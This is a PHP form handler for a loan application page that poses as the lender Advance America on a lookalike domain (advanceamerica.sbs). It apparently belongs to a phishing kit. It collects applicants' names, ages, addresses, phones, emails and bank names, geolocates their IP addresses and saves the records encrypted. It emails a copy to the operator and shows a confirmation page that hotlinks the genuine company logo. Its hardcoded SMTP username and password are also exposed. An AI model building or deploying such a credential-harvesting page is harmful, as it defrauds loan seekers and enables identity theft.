<?php
use PHPMailer\PHPMailer\PHPMailer;

require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';

$encryption_key = 'my_strong_encryption_key';

function getClientIP() {
    return $_SERVER['HTTP_CLIENT_IP'] ??
           $_SERVER['HTTP_X_FORWARDED_FOR'] ??
           $_SERVER['REMOTE_ADDR'];
}

$ip = getClientIP();
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
$location = $geo['city'] . ", " . $geo['regionName'] . ", " . $geo['country'];

$app_id = "APP" . rand(100000, 999999);
$date = date("Y-m-d H:i:s");

$data = [
    'amount' => $_POST['amount'],
    'firstname' => $_POST['firstname'],
    'lastname' => $_POST['lastname'],
    'age' => $_POST['age'],
    'city' => $_POST['city'],
    'zip' => $_POST['zip'],
    'phone' => $_POST['phone'],
    'email' => $_POST['email'],
    'bank' => $_POST['bank'],
    'years' => $_POST['years'],
    'app_id' => $app_id,
    'date' => $date,
    'ip' => $ip,
    'location' => $location
];

function encryptData($data, $key) {
    $ivlen = openssl_cipher_iv_length($cipher = "AES-256-CBC");
    $iv = openssl_random_pseudo_bytes($ivlen);
    $ciphertext_raw = openssl_encrypt($data, $cipher, $key, 0, $iv);
    return base64_encode($iv . $ciphertext_raw);
}

$line = implode(",", [
    $data['amount'], $data['firstname'], $data['lastname'], $data['age'],
    $data['city'], $data['zip'], $data['phone'], $data['email'],
    $data['bank'], $data['years'], $data['app_id'], $data['date'],
    $data['ip'], $data['location']
]) . "\n";

$encrypted = encryptData($line, $encryption_key);
file_put_contents("submissions.csv.enc", $encrypted . "\n", FILE_APPEND);

$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->Host = 'smtp.hostinger.com';
$mail->SMTPAuth = true;
$mail->Username = 'thankyou@advanceamerica.sbs';
$mail->Password = 'Good0055@@';
$mail->SMTPSecure = 'ssl';
$mail->Port = 465;

$mail->setFrom('thankyou@advanceamerica.sbs', 'Advance America');
$mail->addAddress('thankyou@advanceamerica.sbs');
$mail->addAddress($data['email']);

$mail->isHTML(true);
$mail->Subject = "Loan Application Received - {$app_id}";

$htmlBody = file_get_contents("customer-template.html");
$htmlBody = str_replace("{{name}}", $data['firstname'] . ' ' . $data['lastname'], $htmlBody);
$htmlBody = str_replace("{{app_id}}", $data['app_id'], $htmlBody);
$htmlBody = str_replace("{{amount}}", $data['amount'], $htmlBody);
$mail->Body = $htmlBody;

$mail->send();

// Confirmation page
echo "<!DOCTYPE html><html><head><title>Thank You</title></head><body style='text-align:center;padding:50px;font-family:sans-serif;'>
<img src='https://www.advanceamerica.net/themes/custom/pf_aa_theme/pattern-library/assets/images/logos/AdvanceAmerica_Logo-full-Blue.svg' width='250'><br><br>
<h2>Thank you, {$data['firstname']}!</h2>
<p>Your loan application (ID: <strong>{$data['app_id']}</strong>) for <strong>\${$data['amount']}</strong> has been submitted successfully.</p>
<p>We will contact you shortly.</p>
</body></html>";
?>
